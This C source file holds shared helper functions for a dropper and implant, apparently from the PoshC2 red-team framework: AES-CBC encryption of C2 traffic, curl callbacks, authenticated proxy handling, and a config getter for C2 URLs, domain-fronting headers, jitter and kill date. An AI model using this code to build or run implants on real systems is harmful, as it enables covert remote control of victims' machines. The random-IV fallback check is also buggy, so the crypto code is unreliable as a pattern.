/*
 * Various common functions used in BOTH the dropper and the implant
 *
 */
#include <stdlib.h>
#include <stddef.h>
#include <string.h>
#include <stdio.h>
#include "mbedtls/aes.h"
#include "base64.h"
#include "common.h"
#include <curl/curl.h>


// callback function for processing curl responses
size_t curl_cb(void *data, size_t size, size_t nmemb, void *userp)
 {
   size_t realsize = size * nmemb;
   struct memory *mem = (struct memory *)userp;
   fflush(stdout);
   unsigned char *ptr = realloc(mem->response, mem->size + realsize + 1);
   if(ptr == NULL)
     return 0;  /* out of memory! */
 
   mem->response = ptr;
   memcpy(&(mem->response[mem->size]), data, realsize);
   mem->size += realsize;
   mem->response[mem->size] = 0;
 
   return realsize;
 }

// hexdump for debugging values
#ifdef DEBUG
void hexdump(char *identifier, unsigned char *ptr, int size) {
	printf("%s", identifier);
	if (size > 500) {
		size = 500;
	}
	for (int i=0;i<size;i++){
		printf("%02x", *ptr);
		ptr++;
	}
	printf("\n");
}
#endif

unsigned char * _decrypt(const char *b64_key, unsigned char *data, size_t data_len, size_t *pt_len) {
	const int block_size = 16;
	size_t ct_len = data_len - block_size, key_len;
	unsigned char iv[block_size];
	mbedtls_aes_context aes;

	dprintf("decrypting data len: %d\n", data_len - block_size);

	if (data_len % block_size != 0) {
		return NULL; // hmm, bit dangerous?
	}

	unsigned char *decoded_key = base64_decode((unsigned char *)b64_key, strlen(b64_key), &key_len);
	mbedtls_aes_setkey_dec( &aes, decoded_key, key_len * 8 );

	// extract iv from first bytes of message
	memcpy(iv, data, block_size);
#ifdef DEBUG
	hexdump("IV: ", iv, block_size);
#endif
	unsigned char *ct = malloc(ct_len); // FREE
	memcpy(ct, data+block_size, ct_len);

#ifdef DEBUG
	hexdump("CT: ", ct, data_len - block_size);
#endif
	unsigned char *output = malloc(ct_len+1);
	mbedtls_aes_crypt_cbc( &aes, MBEDTLS_AES_DECRYPT, ct_len, iv, ct, output);

#ifdef DEBUG
	hexdump("PT: ", output, ct_len);
#endif
	free(ct);

	// loop through the plaintext looking for a null char. If we find one, set the length to its position
	// A better approach would be for posh to use pkcs padding so we can work out the length
	for (int i=0; i<ct_len; i++){
		if (output[i] == '\0') {
			*pt_len = i;
			return output;
		} 
	}

	// otherwise, null terminate the output and set the output to its length
	output[ct_len] = '\0';
	*pt_len = ct_len;

	return output;
}

unsigned char * _encrypt(const char *b64_key, char *data, size_t data_len, size_t *output_len, int b64) 
{
	size_t key_len;
	size_t padded_len=0;
        size_t	block_size=16;
	size_t res=0;
	unsigned char iv[block_size];
	unsigned char initial_iv[block_size];

	mbedtls_aes_context aes;

	unsigned char *decoded_key = base64_decode((unsigned char*)b64_key, strlen(b64_key), &key_len);
	mbedtls_aes_setkey_enc( &aes, decoded_key, key_len * 8 );

	// initialise IV
	FILE *urandom = fopen("/dev/urandom", "r");
	if (urandom >= 0)
	{
		res = fread(iv, sizeof(iv), 1, urandom);
	} else if (urandom <0 || res < 0) {
		dprintf("%s\n", "No random available"); // generate with rand(). Not cryptographically secure
		for (int i=0; i<block_size; i++) { // assumes srand has been called by caller
			iv[i] = rand();
		}
	}
	fclose(urandom);

#ifdef DEBUG
	hexdump("IV: ", &iv[0], 16);
#endif

	// must 'save' the IV here, as it will be updated by the call to mbedtls_aes_crypt_cbc
	memcpy(initial_iv, iv, block_size);

	// create padded data multiple of block size
	if (data_len % block_size != 0) {
		padded_len = data_len + (block_size - (data_len % block_size));
	} else {
		padded_len = data_len;
	}
	dprintf("Padded size: %d = %d + (%d - (%d mod %d)\n", padded_len, data_len, block_size, data_len, block_size);

	unsigned char *padded_data = malloc(padded_len); // FREE
	unsigned char *encrypted_data = malloc(padded_len); // FREE

	memset(padded_data, 0, padded_len); // the posh crypto scheme just pads with zeros
	memcpy(padded_data, data, data_len);

#ifdef DEBUG
	hexdump("Plaintext: ", padded_data, padded_len);
#endif

	mbedtls_aes_crypt_cbc( &aes, MBEDTLS_AES_ENCRYPT, padded_len, iv, padded_data, encrypted_data);

#ifdef DEBUG
	hexdump("CT: ", encrypted_data, padded_len);
#endif
	
	unsigned char *output_data = malloc(padded_len + block_size); // FREE
	// prepend the IV to the ciphertext
	memcpy(output_data, initial_iv, block_size);
	memcpy(output_data + block_size, encrypted_data, padded_len);

#ifdef DEBUG
	hexdump("prepended CT: ", output_data, padded_len + 16);
#endif
	if (b64 == 1) {	
		unsigned char *b64_data = base64_encode(output_data, padded_len + block_size, output_len); 

		// free stuff we don't need anymore
		free(padded_data);
		free(encrypted_data);
		free(output_data);

		return b64_data;
	} else {
		*output_len = padded_len+16;
		return output_data;
	}
}


int startswith(const char *str, char *prefix) {
	// this won't work if prefix is longer than string!
	if (strlen(prefix) > strlen(str)) {
		return 0;
	}

	while(*prefix) {
		if (*prefix++ != *str++) {
			return 0;
		}
	}

	return 1;
}

char *get_proxy(const char *proxy_url, const char *proxy_user, const char *proxy_pass) {
	// Configure the CURL proxy option
	char *proxy = malloc(strlen(proxy_url) + strlen(proxy_user) + strlen(proxy_pass) + strlen(":@") + 1); // this might over-allocate by two chars if username & password not specified
	// need to 'embed' the username and password in the proxy URL
	// e.g. http://user:pass@192.168.1.1	
	//
	
	char *p = proxy;
	const char *s = proxy_url;
	dprintf("Have source proxy_url %s", proxy_url);	

	// copy up until the second /
	int slashes_seen = 0;
	do {
		*p = *s;	
		if (*s == '/') {
			slashes_seen++;
		}
		p++;
		s++;
	} while (slashes_seen < 2 && *s!='\0');
	*p = '\0';
	if (*s == '\0') {
		dprintf("Unable to parse proxy URL %s", proxy_url);
		free(proxy);
		proxy=NULL;
		return proxy;
	} else {

		strcat(proxy, proxy_user);
		strcat(proxy, ":");
		strcat(proxy, proxy_pass);
		strcat(proxy, "@");
		strcat(proxy, s);
		dprintf("Using proxy url: %s\n", proxy);
		return proxy;
	}
}

const void set_sleep_time(struct config *config, int sleep_time) {
	config->sleep_time = sleep_time;
}

const void* get_config_item(struct config *config, int config_key){
	switch (config_key) {
		case POSH_KEY:
			return config->key;
			break;
		case POSH_URLID:
			return &config->urlid;
			break;
		case POSH_URL_SUFFIX2:
			return config->url_suffix2;
			break;
		case POSH_PROXY_URL:
			return config->proxy_url;
			break;
		case POSH_PROXY_USER:
			return config->proxy_user;
			break;
		case POSH_PROXY_PASS:
			return config->proxy_pass;
			break;
		case POSH_UA:
			return config->ua;
			break;
		case POSH_NUM_DOMAIN_HEADERS:
			return &config->num_domain_headers;
			break;
		case POSH_DOMAIN_FRONT_HEADERS:
			return config->domain_front_headers;
			break;
		case POSH_NUM_SERVERS:
			return &config->num_servers;
			break;
		case POSH_SERVERCLEAN:
			return config->serverclean;
			break;
		case POSH_NUM_URLS:
			return &config->num_urls;
			break;
		case POSH_URLS:
			return config->urls;
			break;
		case POSH_NUM_ICOIMAGE:
			return &config->num_icoimage;
			break;
		case POSH_ICOIMAGE:
			return config->icoimage;
			break;
		case POSH_JITTER:
			return &config->jitter;
			break;
		case POSH_SLEEP_TIME:
			return &config->sleep_time;
			break;
		case POSH_KILL_DATE:
			return &config->kill_date;
			break;
		default:
			return NULL;
			break;
	}
}


